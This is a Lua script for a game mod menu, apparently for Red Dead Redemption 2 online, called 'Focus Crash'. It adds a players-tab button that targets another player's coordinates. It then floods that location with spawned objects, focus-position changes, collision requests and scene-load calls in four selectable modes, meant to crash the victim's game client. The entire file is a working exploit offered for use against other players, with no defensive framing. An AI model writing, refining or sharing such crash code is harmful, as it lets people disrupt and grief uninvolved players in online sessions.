system.setScriptName("~e~Focus ~e~CrashV0.2")

system.registerConstructor(function()
    logger.logInfo("--==============================--")
    logger.logInfo("--         Focus Crash          --")
    logger.logInfo("--            v0.2              --")
    logger.logInfo("--==============================--")
    logger.logInfo("Focus Crash ready, use from the players tab.")
end)

-- Model hashes
local hash_model_1 = 0x0FD92BD2  -- p_test_tinthorse
local hash_model_2 = 0x6927D266  -- s_chuckwagonawning01b

-- Spawned object tracking
local spawnedObjects = {}
local spawnTimes = {}
local deleteDelay = 6000

-- Default values
numObjects = 1
crashMode = 1 -- 1 = Focus Flood, 2 = Collision Flood, 3 = Scene Flood, 4 = Combined

-- Menu
local crash_id = menu.addSubmenu('player', 'Focus Crashes', 'Focus Crash')

-- Spinner for object count
menu.addIntSpinner(
    crash_id,
    'Number of Objects',
    'How many objects to spawn per crash (1-40)',
    1, 40, 1, 1,
    function(value, playerIdx)
        numObjects = value
        logger.logInfo('Object count set to ' .. numObjects)
    end
)

-- Spinner for crash mode
menu.addIntSpinner(
    crash_id,
    'Crash Mode (1-4)',
    '1=Focus Flood, 2=Collision Flood, 3=Scene Flood, 4=Combined',
    1, 4, 1, 1,
    function(value, playerIdx)
        crashMode = value
        local modeNames = {
            [1] = 'Focus Flood',
            [2] = 'Collision Flood',
            [3] = 'Scene Flood',
            [4] = 'Combined'
        }
        logger.logInfo('Crash mode set to: ' .. (modeNames[value] or 'Unknown'))
    end
)

-- Auto cleanup tick
system.registerTick(function(frame)
    local currentTick = system.getTickCount64()
    for i = #spawnedObjects, 1, -1 do
        local obj = spawnedObjects[i]
        if not spawnTimes[obj] then
            spawnTimes[obj] = currentTick
        end
        if currentTick - spawnTimes[obj] > deleteDelay then
            if natives.entity_doesEntityExist(obj) then
                spawner.deleteObject(obj)
            end
            table.remove(spawnedObjects, i)
            spawnTimes[obj] = nil
        end
    end
end)

-- Model loader
local function loadModel1()
    natives.streaming_requestModel(hash_model_1, true)
    if not natives.streaming_isModelValid(hash_model_1) then
        logger.logError(tostring(hash_model_1) .. ' model [0x0FD92BD2] is not valid!')
        return false
    end
    while not natives.streaming_hasModelLoaded(hash_model_1) do
        system.yield(50)
    end
    return true
end

local function loadModel2()
    natives.streaming_requestModel(hash_model_2, true)
    if not natives.streaming_isModelValid(hash_model_2) then
        logger.logError(tostring(hash_model_2) .. ' model [0x7A6A77C7] is not valid!')
        return false
    end
    while not natives.streaming_hasModelLoaded(hash_model_2) do
        system.yield(50)
    end
    return true
end
--\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
-- MODE 1: Focus Flood (like Chuck Crash but uses SET_FOCUS_POS_AND_VEL)
local function focusFlood(tx, ty, tz)
    loadModel1()
    system.yield(500)
    for i = 1, numObjects do
        local oz = tz + (i * 1000)
        local obj = spawner.spawnObject(natives.misc_getHashKey("p_test_tinthorse"), tx, ty, oz)
        -- Rapidly shift focus using position + velocity vector to different extremes
        natives.invoke(0x25F6EF88664540E2, "void", tx, ty, oz, tx * i, ty * i, oz * i)
        natives.streaming_setFocusEntity(obj)
        table.insert(spawnedObjects, obj)
        system.yield(10)
    end
end

-- MODE 2: Collision Flood (spam collision requests at extreme coords)
local function collisionFlood(tx, ty, tz)
    for i = 1, numObjects do
        local ox = tx + (i * 500)
        local oy = ty + (i * 500)
        local oz = tz + (i * 500)
        -- Request collision data at many different coords simultaneously
        natives.invoke(0x0A3720F162A033C9, "void", ox, oy, oz)
        natives.invoke(0x0A3720F162A033C9, "void", -ox, -oy, oz)
        natives.invoke(0x0A3720F162A033C9, "void", ox, -oy, -oz)
        system.yield(10)
    end
end

-- MODE 3: Scene Load Flood (spam LOAD_SCENE_START_SPHERE at target coords)
local function sceneFlood(tx, ty, tz)
    for i = 1, numObjects do
        local radius = i * 500.0
        -- Trigger multiple overlapping scene loads at extreme radii
        natives.invoke(0x513F8AA5BF2F17CF, "boolean", tx, ty, tz + (i * 1000), radius, 0)
        natives.invoke(0x387AD749E3B69B70, "boolean", tx, ty, tz, tx, ty, tz + (i * 2000), radius, 0)
        system.yield(10)
    end
end

-- MODE 4: Combined (all three at once)
local function combinedCrash(tx, ty, tz)
    loadModel1()
    loadModel2()
    system.yield(1000)
    for i = 1, numObjects do
        local oz = tz + (i * 1000)

        -- Focus abuse
        local obj1 = spawner.spawnObject(natives.misc_getHashKey("p_test_tinthorse"), tx, ty, oz)
        natives.invoke(0x25F6EF88664540E2, "void", tx, ty, oz, tx * i, ty * i, oz * i)
        natives.streaming_setFocusEntity(obj1)
        table.insert(spawnedObjects, obj1)

        -- Collision flood
        natives.invoke(0x0A3720F162A033C9, "void", tx + (i * 500), ty + (i * 500), oz)
        natives.invoke(0x0A3720F162A033C9, "void", -(tx + i * 500), -(ty + i * 500), oz)

        -- Scene flood
        natives.invoke(0x513F8AA5BF2F17CF, "boolean", tx, ty, oz, i * 500.0, 0)

        -- Extra object for weight
        local obj2 = spawner.spawnObject(natives.misc_getHashKey("s_chuckwagonawning01b"), tx, ty, tz)
        table.insert(spawnedObjects, obj2)

        system.yield(10)
    end
end
--\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
-- Main crash function
local function focusCrash(player_idx)
    local player_name = player.getName(player_idx)
    local tx, ty, tz = player.getCoords(player_idx)

    logger.logInfo('=== FOCUS CRASH START ===')
    logger.logInfo('Target: ' .. player_name)
    logger.logInfo('Mode: ' .. crashMode .. ' | Objects: ' .. numObjects)

    local ok, err = pcall(function()
        if crashMode == 1 then
            focusFlood(tx, ty, tz)
        elseif crashMode == 2 then
            collisionFlood(tx, ty, tz)
        elseif crashMode == 3 then
            sceneFlood(tx, ty, tz)
        elseif crashMode == 4 then
            combinedCrash(tx, ty, tz)
        end
    end)

    if not ok then
        logger.logError('ERROR: ' .. tostring(err))
    else
        logger.logInfo('Crash sent to: ' .. player_name)
    end

    logger.logInfo('=== FOCUS CRASH END ===')
end

-- Menu button
menu.addButton(crash_id, 'Focus Crash ~e~ [AOE]', '', focusCrash)
